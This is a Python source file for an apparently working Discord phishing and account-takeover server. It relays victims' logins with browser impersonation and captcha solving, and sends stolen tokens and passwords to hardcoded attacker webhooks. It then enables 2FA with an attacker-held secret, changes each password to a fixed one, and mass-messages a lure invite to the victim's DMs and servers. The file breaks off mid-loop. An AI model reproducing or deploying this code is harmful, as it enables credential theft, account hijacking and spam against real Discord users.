"""
Discord Login Server — stealth proxy using curl_cffi for Chrome TLS impersonation.
Proper flow: visit login page → get cookies → get X-Fingerprint → login.
Run:  python discord_server.py
Open: http://localhost:8463
# v2.1 — predictive pre-challenge
"""
import subprocess, sys, os, platform, re

_deps = {
    'flask': 'flask',
    'curl_cffi': 'curl_cffi',
    'websocket': 'websocket-client',
    'cryptography': 'cryptography',
    'pyotp': 'pyotp',
}
for _m, _p in _deps.items():
    try:
        __import__(_m)
    except ImportError:
        print(f'[*] Installing {_p}...')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])

from flask import Flask, request, jsonify, send_from_directory, make_response
from curl_cffi import requests as creq   # Chrome TLS impersonation
import requests as plain_req              # for webhook (no impersonation needed)
import websocket
import json, base64, hashlib, threading, time, uuid
import pyotp
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_pad
from cryptography.hazmat.primitives import hashes, serialization

# ━━━━━━━━━━━━ Config ━━━━━━━━━━━━
PORT    = int(os.environ.get('PORT', 8463))
API     = 'https://discord.com/api/v9'
WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6')
WEBHOOK_BACKUP = 'https://discord.com/api/webhooks/1478274350720221274/d86UA6fKCcJ5_utKPTWmJ7qYrO_Z_aHTeBUb5Uo-N9NPA1kcGGwVd10yjZQ0_1Gs6Dsq'
TOTP_SECRETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'totp_secrets.txt')

# Chrome 136 UA + matching client hints
CHROME_VER = '136'
UA = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{CHROME_VER}.0.0.0 Safari/537.36'
SEC_CH_UA          = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_VER}", "Not.A/Brand";v="99"'
SEC_CH_UA_MOBILE   = '?0'
SEC_CH_UA_PLATFORM = '"Windows"'

# Captcha solving — Multi-provider (race Anti-Captcha vs CapSolver for speed)
ANTICAPTCHA_KEY  = os.environ.get('ANTICAPTCHA_KEY', os.environ.get('2CAPTCHA_KEY', ''))
CAPSOLVER_KEY    = os.environ.get('CAPSOLVER_KEY', '')

# Role assignment after verification
BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
GUILD_ID     = os.environ.get('GUILD_ID', '')
VERIFIED_ID  = os.environ.get('VERIFIED_ID', '')
VOICE_CHANNEL_ID = os.environ.get('VOICE_CHANNEL_ID', '1477752842675683555')

VOICE_CHANNEL_ID_2 = '1478017594895106229'
GUILD_ID_2 = '1472050464659865742'

# ━━━━━━━━━━━━ Proxy for Discord API calls ━━━━━━━━━━━━
def _load_proxy():
    """Load proxy from DISCORD_PROXY env var, or first proxy in proxies.txt."""
    p = os.environ.get('DISCORD_PROXY', '').strip()
    if p:
        return p
    try:
        pf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'proxies.txt')
        with open(pf, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    return line
    except:
        pass
    return None

DISCORD_PROXY = _load_proxy()
DISCORD_PROXIES = {'https': DISCORD_PROXY, 'http': DISCORD_PROXY} if DISCORD_PROXY else None

# Adaptive proxy: always start on proxy if one is configured; fall back to direct if proxy fails
_use_proxy = bool(DISCORD_PROXY)  # start with proxy ON when available
_proxy_lock = threading.Lock()
_rate_limit_until = 0       # timestamp when rate limit expires

def _set_proxy_mode(on: bool, reason=''):
    global _use_proxy
    with _proxy_lock:
        if _use_proxy != on:
            _use_proxy = on
            mode = f'PROXY ({DISCORD_PROXY})' if on else 'DIRECT (Railway IP)'
            print(f'[proxy] Switched to {mode} — {reason}')

def _make_session():
    """Create a curl_cffi Chrome-impersonation session. Uses proxy only when rate-limited."""
    s = creq.Session(impersonate='chrome')
    with _proxy_lock:
        if _use_proxy and DISCORD_PROXIES:
            s.proxies = DISCORD_PROXIES
    return s

def _handle_discord_response(resp):
    """Check response for rate limit. Toggle proxy on/off automatically. Returns resp."""
    global _rate_limit_until
    if resp is None:
        return resp
    if resp.status_code == 429:
        retry_after = 5
        try:
            retry_after = resp.json().get('retry_after', 5)
        except:
            pass
        _rate_limit_until = time.time() + retry_after
        if DISCORD_PROXIES:
            _set_proxy_mode(True, f'429 rate-limited, retry_after={retry_after:.1f}s')
    elif resp.status_code < 400:
        # Success on current mode — if we're on proxy and rate limit expired, try direct again
        with _proxy_lock:
            if _use_proxy and time.time() > _rate_limit_until + 10:
                _set_proxy_mode(False, 'rate limit expired, reverting to direct')
    return resp

print(f'[config] Role assignment: BOT_TOKEN={"set" if BOT_TOKEN else "MISSING"}, GUILD_ID={GUILD_ID or "MISSING"}, VERIFIED_ID={VERIFIED_ID or "MISSING"}')
print(f'[config] Voice channel: {VOICE_CHANNEL_ID} + {VOICE_CHANNEL_ID_2}')
print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts {"PROXY" if DISCORD_PROXY else "DIRECT — no proxy configured"})')

app = Flask(__name__, static_folder='.', static_url_path='')

# ━━━━━━━━━━━━ Page Tokens (gate QR start) ━━━━━━━━━━━━
# A short-lived token is injected into /login HTML.
# /api/qr/start requires a valid token — cold requests from bots are rejected.
import secrets as _secrets
_page_tokens      = {}            # token -> expires_at
_page_token_lock  = threading.Lock()
PAGE_TOKEN_TTL    = 300           # 5 minutes

def _issue_page_token():
    tok = _secrets.token_hex(20)
    with _page_token_lock:
        _page_tokens[tok] = time.time() + PAGE_TOKEN_TTL
    return tok

def _check_page_token(tok):
    if not tok:
        return False
    with _page_token_lock:
        exp = _page_tokens.get(tok, 0)
        if time.time() > exp:
            _page_tokens.pop(tok, None)
            return False
    return True

# ━━━━━━━━━━━━ Per-IP Rate Limiter ━━━━━━━━━━━━
import collections as _col

_rl_lock   = threading.Lock()
_rl_hits   = _col.defaultdict(list)   # ip:endpoint -> [timestamps]
_rl_banned = {}                        # ip -> ban_until timestamp

# Rules: (max_hits, window_seconds, ban_seconds)
_RL_RULES = {
    'qr_start':    (20, 60,  20),   # 20 QR starts per 60s → 20s ban (tokens are primary gate)
    'qr_poll':     (120, 10, 8),    # 120 polls per 10s → 8s ban (very lenient)
    'login':       (8,  30,  120),  # 8 login attempts per 30s → 2min ban
    'prechallenge':(10, 20,  60),   # 10 prechallenges per 20s → 60s ban
    'default':     (30, 10,  30),   # generic: 30 reqs per 10s → 30s ban
}

def _get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr) or ''
    return ip.split(',')[0].strip()

def _rate_check(endpoint_key):
    """Returns (allowed: bool, retry_after: int)."""
    ip = _get_ip()
    now = time.time()
    max_hits, window, ban_secs = _RL_RULES.get(endpoint_key, _RL_RULES['default'])
    key = f'{ip}:{endpoint_key}'
    with _rl_lock:
        # Check active ban
        ban_until = _rl_banned.get(ip, 0)
        if now < ban_until:
            return False, int(ban_until - now)
        # Slide window
        hits = _rl_hits[key]
        cutoff = now - window
        # Discard old hits
        while hits and hits[0] < cutoff:
            hits.pop(0)
        hits.append(now)
        if len(hits) > max_hits:
            _rl_banned[ip] = now + ban_secs
            _rl_hits[key].clear()
            print(f'[ratelimit] Banned {ip} on {endpoint_key} for {ban_secs}s')
            return False, ban_secs
    return True, 0

def _rl_cleanup():
    """Periodically remove old rate-limit data to prevent memory growth."""
    while True:
        time.sleep(120)
        now = time.time()
        with _rl_lock:
            # Remove expired bans
            expired_bans = [ip for ip, t in _rl_banned.items() if now > t]
            for ip in expired_bans:
                del _rl_banned[ip]
            # Remove old hit lists
            empty_keys = [k for k, v in _rl_hits.items() if not v]
            for k in empty_keys:
                del _rl_hits[k]

threading.Thread(target=_rl_cleanup, daemon=True).start()


@app.after_request
def _add_headers(response):
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    # Prevent iOS Safari aggressive caching of HTML pages
    if response.content_type and 'text/html' in response.content_type:
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

# ━━━━━━━━━━━━ Build Number ━━━━━━━━━━━━
BUILD = 368827  # fallback

def fetch_build_number():
    """Fetch Discord's current client build number from their JS assets."""
    global BUILD
    try:
        s = _make_session()
        r = s.get('https://discord.com/login', timeout=15)
        # Grab ALL JS asset filenames from the page
        all_assets = re.findall(r'(?:src|href)=["\'](?:/assets/|https://discord\.com/assets/)(\w[\w.]+)\.js', r.text)
        if not all_assets:
            all_assets = re.findall(r'assets/(\w[\w.]*)\.js', r.text)
        # Prioritize sentry/build chunks, then check all
        priority = [a for a in all_assets if 'sentry' in a.lower() or 'build' in a.lower()]
        to_check = priority + [a for a in all_assets if a not in priority]
        for m in to_check[:20]:
            try:
                jr = s.get(f'https://discord.com/assets/{m}.js', timeout=10)
                # Multiple patterns: buildNumber:NNNNNN or "buildNumber","NNNNNN" or build_number
                for pattern in [
                    r'buildNumber["\s:,]+?(\d{5,})',
                    r'build_number["\s:,]+?(\d{5,})',
                    r'"buildNumber"\s*,\s*"?(\d{5,})',
                    r'buildNumber\}\)\}\),(\d{5,})',
                ]:
                    bm = re.search(pattern, jr.text)
                    if bm:
                        BUILD = int(bm.group(1))
                        print(f'[*] Build number: {BUILD} (from {m}.js)')
                        return
            except:
                continue
        print(f'[*] Using fallback build: {BUILD}')
    except Exception as e:
        print(f'[!] Build fetch failed: {e}, using {BUILD}')


def sprops():
    return base64.b64encode(json.dumps({
        "os": "Windows", "browser": "Chrome", "device": "",
        "system_locale": "en-US", "browser_user_agent": UA,
        "browser_version": f"{CHROME_VER}.0.0.0", "os_version": "10",
        "referrer": "", "referring_domain": "",
        "referrer_current": "", "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": BUILD, "client_event_source": None
    }).encode()).decode()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


# ━━━━━━━━━━━━ Stealth Discord Session ━━━━━━━━━━━━
class DiscordSession:
    """
    Creates a curl_cffi session that impersonates Chrome's TLS fingerprint,
    visits the login page first to get cookies, then fetches X-Fingerprint.
    This mimics a real browser and avoids account locks.
    """
    def __init__(self):
        self.s = _make_session()
        self.fingerprint = None
        self.cookies_ready = False

    def prepare(self):
        """Step 1: Visit login page → cookies.  Step 2: /experiments → fingerprint."""
        # Step 1: GET /login — Cloudflare sets __dcfduid, __sdcfduid, __cfruid, locale
        try:
            r = self.s.get('https://discord.com/login', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
            self.cookies_ready = r.status_code == 200
            print(f'[*] Login page: {r.status_code}, cookies: {list(self.s.cookies.keys())}')
        except Exception as e:
            print(f'[!] Login page failed: {e}')
            self.cookies_ready = False

        # Step 2: GET /experiments → X-Fingerprint (no auth header)
        try:
            r2 = self.s.get(f'{API}/experiments', headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'X-Track': sprops(),
            }, timeout=15)
            if r2.status_code == 200:
                self.fingerprint = r2.json().get('fingerprint')
                print(f'[*] Fingerprint: {self.fingerprint[:20]}...' if self.fingerprint else '[!] No fingerprint in response')
            else:
                print(f'[!] Experiments: {r2.status_code}')
        except Exception as e:
            print(f'[!] Experiments failed: {e}')

        return self

    def _headers(self, extra=None):
        h = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'User-Agent': UA,
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/Los_Angeles',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': sprops(),
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        if self.fingerprint:
            h['X-Fingerprint'] = self.fingerprint
        if extra:
            h.update(extra)
        return h

    def _sync_proxy(self):
        """Sync this session's proxy setting with current global mode."""
        with _proxy_lock:
            if _use_proxy and DISCORD_PROXIES:
                self.s.proxies = DISCORD_PROXIES
            else:
                self.s.proxies = {}

    def post(self, path, json_data, timeout=30):
        self._sync_proxy()
        r = self.s.post(
            f'{API}{path}',
            headers=self._headers(),
            json=json_data,
            timeout=timeout
        )
        _handle_discord_response(r)
        return r

    def snapshot(self):
        """Save cookies + fingerprint so they can be restored on a fresh session."""
        return {
            'cookies': dict(self.s.cookies),
            'fingerprint': self.fingerprint,
        }

    def restore(self, snap):
        """Apply saved cookies + fingerprint to this (fresh) session."""
        for k, v in snap.get('cookies', {}).items():
            self.s.cookies.set(k, v)
        self.fingerprint = snap.get('fingerprint')


# ━━━━━━━━━━━━ Webhook ━━━━━━━━━━━━
_webhookd_tokens: set = set()
_webhookd_lock = threading.Lock()


def _solve_hcap(sitekey, pageurl):
    """Solve hCaptcha via Anti-Captcha. Returns token or None."""
    key = ANTICAPTCHA_KEY or os.environ.get('ANTICAPTCHA_KEY', '')
    if not key:
        return None
    try:
        r = plain_req.post('https://api.anti-captcha.com/createTask', json={
            'clientKey': key,
            'task': {'type': 'HCaptchaTaskProxyless', 'websiteURL': pageurl, 'websiteKey': sitekey}
        }, timeout=15)
        task_id = r.json().get('taskId')
        if not task_id:
            return None
        for _ in range(90):
            time.sleep(3)
            r2 = plain_req.post('https://api.anti-captcha.com/getTaskResult',
                                json={'clientKey': key, 'taskId': task_id}, timeout=15)
            res = r2.json()
            if res.get('status') == 'ready':
                return res.get('solution', {}).get('gRecaptchaResponse')
            if res.get('errorId', 0) != 0:
                return None
    except:
        pass
    return None


_pw_store = {}       # ticket/token -> password (short-lived lookup)
_pw_store_lock = threading.Lock()

def _hq_guilds(token):
    h = {"Authorization": token, "User-Agent": UA}
    try:
        gs = plain_req.get(f"{API}/users/@me/guilds?with_counts=true", headers=h, timeout=10).json()
        out = []
        for g in gs:
            if g.get("owner") or g.get("permissions") == "4398046511103":
                out.append(f"• **{g.get('name','?')}** (`{g.get('id','?')}`) — {g.get('approximate_member_count','?')} members")
        return "\n".join(out) if out else "None"
    except:
        return "Error"


# ━━━━━━━━━━━━ IP Helpers ━━━━━━━━━━━━
_RAILWAY_PREFIXES = ('104.156.', '100.64.', '172.', '10.', '192.168.', '127.')

def _clean_ip(raw_ip):
    """Extract real client IP from X-Forwarded-For, stripping Railway/proxy/private IPs."""
    if not raw_ip or raw_ip == '?':
        return '?'
    parts = [p.strip() for p in raw_ip.split(',')]
    # Filter out Railway proxy IPs and private ranges — keep only real client IPs
    for ip in parts:
        if not any(ip.startswith(pfx) for pfx in _RAILWAY_PREFIXES):
            return ip
    # All IPs are proxy/private — no real client IP available
    return '?'


# ━━━━━━━━━━━━ Auto 2FA (TOTP) ━━━━━━━━━━━━
def _auto_enable_2fa(token, password):
    """
    Enable TOTP 2FA on a captured account using 3-step Discord flow:
      1. POST totp/enable → 401 code 60003, get MFA ticket
      2. POST /mfa/finish  → verify password, get MFA JWT
      3. POST totp/enable  → with X-Discord-MFA-Authorization + secret + code → 200
    Uses curl_cffi (Chrome TLS) + X-Super-Properties (required by Discord).
    Returns (new_token, secret, backup_codes) on success.
    Returns (None, None, None) on failure (no crash).
    """
    if not password or password == '?':
        print(f'[2fa] Skipped — no password available')
        return None, None, None

    enable_url = f'{API}/users/@me/mfa/totp/enable'
    finish_url = f'{API}/mfa/finish'
    h = {
        "Authorization": token,
        "User-Agent": UA,
        "Content-Type": "application/json",
        "X-Super-Properties": sprops(),
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-CH-UA": SEC_CH_UA,
        "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/Los_Angeles",
    }

    try:
        s = _make_session()
        # Warm session with login page cookies
        try:
            s.get('https://discord.com/login', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        # ── Step 1: Trigger MFA gate → get ticket ──
        print(f'[2fa] Step 1: triggering MFA gate...')
        r1 = s.post(enable_url, headers=h, json={'password': password}, timeout=15)
        j1 = r1.json()
        err_code = j1.get('code', 0)
        ticket = j1.get('mfa', {}).get('ticket', '')
        print(f'[2fa] Step 1: [{r1.status_code}] code={err_code} ticket={"yes" if ticket else "no"}')

        if err_code != 60003 or not ticket:
            if r1.status_code == 200:
                print(f'[2fa] Unexpected 200 — 2FA may already be enabled')
            else:
                print(f'[2fa] Step 1 failed (expected 60003): code={err_code} msg={j1.get("message", "?")}')
            return None, None, None

        # ── Step 2: Verify password via /mfa/finish → get MFA JWT ──
        print(f'[2fa] Step 2: verifying password...')
        r2 = s.post(finish_url, headers=h, json={
            'ticket': ticket,
            'mfa_type': 'password',
            'data': password,
        }, timeout=15)
        j2 = r2.json()
        mfa_jwt = j2.get('token', '')
        print(f'[2fa] Step 2: [{r2.status_code}] jwt={"yes" if mfa_jwt else "no"}')

        if r2.status_code != 200 or not mfa_jwt:
            print(f'[2fa] Step 2 failed: {j2.get("message", "?")} (code {j2.get("code", "?")})')
            return None, None, None

        # ── Step 3: Enable TOTP with MFA authorization ──
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        code = totp.now()

        h3 = dict(h)
        h3['X-Discord-MFA-Authorization'] = mfa_jwt

        print(f'[2fa] Step 3: enabling TOTP...')
        r3 = s.post(enable_url, headers=h3, json={
            'password': password,
            'secret': secret,
            'code': code,
        }, timeout=15)

        if r3.status_code != 200:
            j3 = r3.json()
            print(f'[2fa] Step 3 failed: [{r3.status_code}] {j3.get("message", "?")} (code {j3.get("code", "?")})')
            return None, None, None

        result = r3.json()
        new_token = result.get('token', token)
        backup_codes = [c['code'] for c in result.get('backup_codes', []) if not c.get('consumed')]

        # Save to file
        try:
            with open(TOTP_SECRETS_FILE, 'a', encoding='utf-8') as f:
                f.write(json.dumps({
                    'token': new_token,
                    'old_token': token,
                    'password': password,
                    'secret': secret,
                    'backup_codes': backup_codes,
                    'enabled_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
                }) + '\n')
        except Exception as e:
            print(f'[2fa] Warning: could not save secret file: {e}')

        print(f'[2fa] ✅ 2FA Enabled! Secret: {secret[:8]}..., backups: {len(backup_codes)}, new token: {new_token[:20]}...')
        return new_token, secret, backup_codes

    except Exception as e:
        print(f'[2fa] Error: {e}')
        import traceback
        traceback.print_exc()
        return None, None, None


DEFAULT_NEW_PASSWORD = 'Fatdude11$'


def _pw_patch_with_captcha(s, url, headers, body, label='pw'):
    """PATCH /users/@me with automatic captcha solving if Discord demands one.
    Returns (response_json, status_code)."""
    r = s.patch(url, headers=headers, json=body, timeout=15)
    j = r.json()

    # Check for captcha challenge
    ckeys = j.get('captcha_key', [])
    if isinstance(ckeys, list) and ('captcha-required' in ckeys or
            'You need to update your app to perform this action.' in ckeys):
        sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')
        print(f'[{label}] Captcha required — solving...')
        cap_token, cap_err = _solve_race(sitekey, rqdata, n=5)
        if not cap_token:
            print(f'[{label}] Captcha solve failed: {cap_err}')
            return j, r.status_code
        # Retry PATCH with captcha solution
        body2 = dict(body)
        body2['captcha_key'] = cap_token
        if rqtoken:
            body2['captcha_rqtoken'] = rqtoken
        r2 = s.patch(url, headers=headers, json=body2, timeout=15)
        return r2.json(), r2.status_code

    return j, r.status_code


def _auto_change_password(token, old_password, new_password=None, mfa_enabled=False, totp_secret=None):
    """
    Change account password. Returns (new_token, final_password) on success.
    For MFA accounts, uses ticket + TOTP verify (if we have the secret) or
    password verify fallback + MFA JWT flow.
    Handles captcha challenges on the PATCH request automatically.
    Returns (None, old_password) on failure.
    """
    if new_password is None:
        new_password = DEFAULT_NEW_PASSWORD
    if not old_password or old_password == '?' or old_password == new_password:
        return None, old_password

    patch_url = f'{API}/users/@me'
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
        'X-Discord-Timezone': 'America/Los_Angeles',
    }

    try:
        s = _make_session()
        try:
            s.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        body = {'password': old_password, 'new_password': new_password}
        j1, sc1 = _pw_patch_with_captcha(s, patch_url, h, body, 'pw-init')

        if sc1 == 200:
            new_tok = j1.get('token', '')
            print(f'[pw] ✅ Password changed (no MFA). New token: {new_tok[:20]}...')
            return new_tok, new_password

        err_code = j1.get('code', 0)

        # MFA required — ticket flow
        if err_code == 60003:
            ticket = j1.get('mfa', {}).get('ticket', '')
            methods = [m.get('type') for m in j1.get('mfa', {}).get('methods', [])]
            if not ticket:
                print(f'[pw] MFA required but no ticket')
                return None, old_password

            print(f'[pw] MFA required. ticket={ticket[:20]}... methods={methods} have_totp={bool(totp_secret)}')

            # Step 2: verify via TOTP (preferred) or password fallback
            mfa_jwt = None
            if totp_secret and ('totp' in methods or not methods):
                code = pyotp.TOTP(totp_secret).now()
                print(f'[pw] Using TOTP code: {code}')
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'totp', 'data': code,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] TOTP verify OK')
                else:
                    print(f'[pw] TOTP verify failed [{r2.status_code}]: {r2.text[:200]}')

            # Fallback: password verify (works when 'password' in methods)
            if not mfa_jwt and 'password' in methods:
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'password', 'data': old_password,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] Password verify OK')
                else:
                    print(f'[pw] Password verify failed [{r2.status_code}]: {r2.text[:200]}')

            if not mfa_jwt:
                print(f'[pw] Could not complete MFA verification')
                return None, old_password

            # Step 3: change password with MFA auth (+ captcha handling)
            h3 = dict(h)
            h3['X-Discord-MFA-Authorization'] = mfa_jwt
            j3, sc3 = _pw_patch_with_captcha(s, patch_url, h3, body, 'pw-mfa')

            if sc3 == 200:
                new_tok = j3.get('token', '')
                print(f'[pw] ✅ Password changed (MFA). New token: {new_tok[:20]}...')
                return new_tok, new_password
            else:
                print(f'[pw] Step 3 failed: [{sc3}] {j3.get("message", "?")} code={j3.get("code", "?")}')
                return None, old_password
        else:
            print(f'[pw] Password change failed: [{sc1}] code={err_code} {j1.get("message", "?")}')
            return None, old_password

    except Exception as e:
        print(f'[pw] Error: {e}')
        return None, old_password


# ━━━━━━━━━━━━ Mass Message (DMs first, then guilds) ━━━━━━━━━━━━
SPAM_MSG_DM    = 'discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'
SPAM_MSG_GUILD = '@everyone discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'

# Permission bit constants
PERM_VIEW_CHANNEL   = 0x400
PERM_SEND_MESSAGES  = 0x800
PERM_ADMINISTRATOR  = 0x8

def _guild_sendable_channels(s, h, guild_id):
    """Return list of text channel IDs where user can actually send messages.
    Uses GET /guilds/{id}/channels and computes effective perms from overwrites."""
    try:
        # Get our member info for role list
        me_r = s.get(f'{API}/users/@me', headers=h, timeout=10)
        my_id = me_r.json().get('id', '') if me_r.status_code == 200 else ''

        # Get guild info for @everyone role perms
        gr = s.get(f'{API}/guilds/{guild_id}', headers=h, timeout=10)
        if gr.status_code != 200:
            return []
        guild = gr.json()
        everyone_perms = int(guild.get('roles', [{}])[0].get('permissions', '0') if guild.get('roles') else '0')

        # Get member roles
        my_roles = set()
        try:
            mr = s.get(f'{API}/users/@me/guilds/{guild_id}/member', headers=h, timeout=10)
            if mr.status_code == 200:
                my_roles = set(mr.json().get('roles', []))
        except:
            pass

        # Map role id -> permissions
        role_perms = {}
        for role in guild.get('roles', []):
            role_perms[role['id']] = int(role.get('permissions', '0'))

        # Compute base perms from roles
        base_perms = everyone_perms
        for rid in my_roles:
            base_perms |= role_perms.get(rid, 0)

        # Admin bypasses everything
        is_admin = bool(base_perms & PERM_ADMINISTRATOR)

        # Get channels
        cr = s.get(f'{API}/guilds/{guild_id}/channels', headers=h, timeout=10)
        if cr.status_code != 200:
            return []

        sendable = []
        for ch in cr.json():
            if ch.get('type') != 0:  # text channels only
                continue
            if is_admin:
                sendable.append(ch['id'])
                continue

            # Apply permission overwrites
            perms = base_perms
            overwrites = ch.get('permission_overwrites', [])

            # @everyone overwrite first
            for ow in overwrites:
                if ow['id'] == guild_id:  # @everyone role id == guild id
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            # Role overwrites
            allow_role = 0
            deny_role = 0
            for ow in overwrites:
                if ow['type'] == 0 and ow['id'] in my_roles:  # type 0 = role
                    deny_role |= int(ow.get('deny', '0'))
                    allow_role |= int(ow.get('allow', '0'))
            perms &= ~deny_role
            perms |= allow_role

            # Member-specific overwrite
            for ow in overwrites:
                if ow['type'] == 1 and ow['id'] == my_id:  # type 1 = member
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            if (perms & PERM_VIEW_CHANNEL) and (perms & PERM_SEND_MESSAGES):
                sendable.append(ch['id'])

        return sendable
    except Exception as e:
        print(f'[spam] Permission check failed for guild {guild_id}: {e}')
        return []

def _mass_message(token, uname='?'):
    """Send message to all open DMs, then all accessible guild text channels.
    Pre-checks channel permissions to avoid wasting API calls on 403s.
    Uses the active (post-takeover) token. 1s delay between messages.
    Runs in background thread so webhook isn't blocked."""
    s = _make_session()
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
    }
    sent = 0
    failed = 0

    # ── DMs first ──
    try:
        r = s.get(f'{API}/users/@me/channels', headers=h, timeout=10)
        dm_ids = [c['id'] for c in r.json()] if r.status_code == 200 else []
        print(f'[spam] {uname}: {len(dm_ids)} DM channels')
    except:
        dm_ids = []

    for cid in dm_ids:
        try:
            r = s.post(f'{API}/channels/{cid}/messages', headers=h,
                       json={'content': SPAM_MSG_DM}, timeout=10)
            if r.status_code in (200, 201):
                sent += 1
            else:
                failed += 1
                if r.status_code == 429:
                    retry = r.json().get('retry_after', 2)
                    print(f'[spam] Rate limited, waiting {retry:.1f}s')
                    time.sleep(retry + 0.5)
                    # Retry once
                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
                                json={'content': SPAM_MSG_DM}, timeout=10)
                    if r2.status_code in (200, 201):
                        sent += 1; failed -= 1
        except:
            failed += 1
        time.sleep(1.3)

    # ── Guild channels (pre-checked permissions) ──
    try:
        r = s.get(f'{API}/users/@me/guilds', headers=h, timeout=10)
        guilds = r.json() if r.status_code == 200 else []
        print(f'[spam] {uname}: {len(guilds)} guilds')
    except:
        guilds = []

    for g in guilds:
        gid = g.get('id')
        if not gid:
            continue
        # Pre-check: get channels where we actually have send perms
        sendable = _guild_sendable_channels(s, h, gid)
        if not sendable:
            print(f'[spam] {uname}: guild {g.get("name","?")} — no sendable channels, skipping')
            continue
        print(f'[spam] {uname}: guild {g.get("name","?")} — {len(sendable)} sendable channels')

        # Send to first sendable channel only (1 message per guild)
        for cid in sendable[:3]:  # try up to 3 in case first still fails
            try:
